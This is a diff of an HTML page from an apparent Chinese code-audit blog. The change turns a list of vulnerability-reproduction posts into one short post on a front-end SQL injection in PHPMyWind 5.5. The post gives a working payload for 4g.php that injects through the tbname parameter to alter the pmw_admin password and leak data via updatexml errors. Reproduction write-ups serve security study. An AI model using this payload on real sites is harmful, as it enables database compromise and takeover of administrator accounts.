@@ -10,6 +10,11 @@
 
     <!--Description-->
     
+        <meta name="description" content="环境Windows + phptudy
+程序PHPMyWind_5.5
+文章参考https://bbs.ichunqiu.com/thread-46703-1-1.html
+漏洞复现Payload：1/4g.php?m=show&amp;amp;cid=2&amp;amp;tbname=pmw_admin` set">
+    
 
     <!--Author-->
     
@@ -18,7 +23,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="代码审计漏洞实例深度剖析"/>
+        <meta property="og:title" content="PHPMyWind_5.5前台注入"/>
     
 
     <!--Open Graph Description-->
@@ -29,7 +34,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
     
 
     <!--Page Cover-->
@@ -40,7 +45,7 @@
 
     <!-- Title -->
     
-    <title>代码审计漏洞实例深度剖析</title>
+    <title>PHPMyWind_5.5前台注入 - 代码审计漏洞实例深度剖析</title>
 
     <!-- Tachyons Core CSS -->
     <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
@@ -108,14 +113,14 @@
     <!-- Title -->
     <div class="w-100 mw8 center vh-40 dt">
         <div class="dtc v-mid white">
-            <h1 class="f1-l f2-m tc tc-m tl-ns">代码审计·漏洞实例深度剖析</h1>
-            <p class="f4 fw3 pab-100px tc tc-m tl-ns">携手一起走进代码审计的世界.</p>
+            <h1 class="f1-l f2-m tc tc-m tl-ns">PHPMyWind_5.5前台注入</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2018-10-10</p>
         </div>
     </div>
 
     <!-- Icon -->
     <div class="relative w-100 mw8 center white dn dn-m db-ns">
-        <i class="header-icon fa fa fa-magic"></i>
+        <i class="header-icon fa fa-file-text-o"></i>
     </div>
 </div>
 
@@ -123,129 +128,78 @@
 <div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
     <div class="content">
         <div class="mw8 center">
-            
-                <a href="/2018/10/30/CVE-2018-17129/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-10-30</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">MetInfo6.1.2_feedback_admin.class.php_SQL注入(CVE-2018-17129)<span>
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+
+                    <!-- Main Post Content -->
+                    <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows + phptudy</p>
+<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>PHPMyWind_5.5</p>
+<h2 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h2><p><a href="https://bbs.ichunqiu.com/thread-46703-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46703-1-1.html</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/4g.php?m=show&amp;cid=2&amp;tbname=pmw_admin` set password=char(@`%27`)%20where%20id=1 and (updatexml(1,concat(0x7c,(select user())),0))%23`%27`</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://anying.nos-eastchina1.126.net/PHPMyWind_5.5%E5%9B%BE%E7%89%871.png" alt=""></p>
+
+                    
+                    <!-- Tags Bottom -->
+                    
+
+                    <!-- Comments -->
+                    
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5" />
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="http://tachyons.io/img/avatar_1.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="secCode">
         </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
+        <div class="dtc db-l v-mid lh-copy measure center f6 black-50 tj">
+            代码审计漏洞实例深度剖析带你走进另一个安全世界。
         </div>
-    </div>
-</a>
-            
-                <a href="/2018/10/10/PHPMyWind_5.5_SQL_Injection/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-10-10</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">PHPMyWind_5.5前台注入<span>
-        </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
-        </div>
-    </div>
-</a>
-            
-                <a href="/2018/09/30/ECShop_V2.7.3 sql/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-09-30</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">ECShop_V2.7.3注入代码执行漏洞复现<span>
-        </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
-        </div>
-    </div>
-</a>
-            
-                <a href="/2018/09/29/CVE-2015-8562/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-09-29</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">Joomla 3.4.5 反序列化漏洞复现（CVE-2015-8562）<span>
-        </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
-        </div>
-    </div>
-</a>
-            
-                <a href="/2018/09/28/DedeCMS V5.7 SP2_tpl.php/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-09-28</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现<span>
-        </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
-        </div>
-    </div>
-</a>
-            
-                <a href="/2018/09/22/Z-BLOG Blind-XXE/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-09-22</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">Z-BLOG Blind-XXE造成任意文件读取漏洞复现<span>
-        </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
-        </div>
-    </div>
-</a>
-            
-                <a href="/2018/09/20/ThinkPHP3.2_SQL_Injection(2018-08-23)/">
-    <div class="dt w-100 hover-border-main-color pointer pa3 border-color bl mv4">
-        <div class="dtc v-mid w-90 black-70">
-            <div>
-                
-                    <span class="f5 fw3 lh-copy pr4">2018-09-20</span> 
-                
-                
-            </div>
-            <span class="f3 fw3 lh-copy">ThinkPHP3.2 框架sql注入漏洞(2018-08-23)<span>
-        </div>
-        <div class="dtc v-mid w-10 f1 black-50 tr">
-            <i class="fa fa-file-text-o"></i>
-        </div>
-    </div>
-</a>
-            
-        </div>
-    </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5" />
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
     
+        <p>
+            <a href="/2018/10/30/CVE-2018-17129/">MetInfo6.1.2_feedback_admin.class.php_SQL注入(CVE-20</a>
+        </p>
+    
+        <p>
+            <a href="/2018/10/10/PHPMyWind_5.5_SQL_Injection/">PHPMyWind_5.5前台注入</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/30/ECShop_V2.7.3 sql/">ECShop_V2.7.3注入代码执行漏洞复现</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/29/CVE-2015-8562/">Joomla 3.4.5 反序列化漏洞复现（CVE-2015-8562）</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/28/DedeCMS V5.7 SP2_tpl.php/">DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
 </div>
 
 
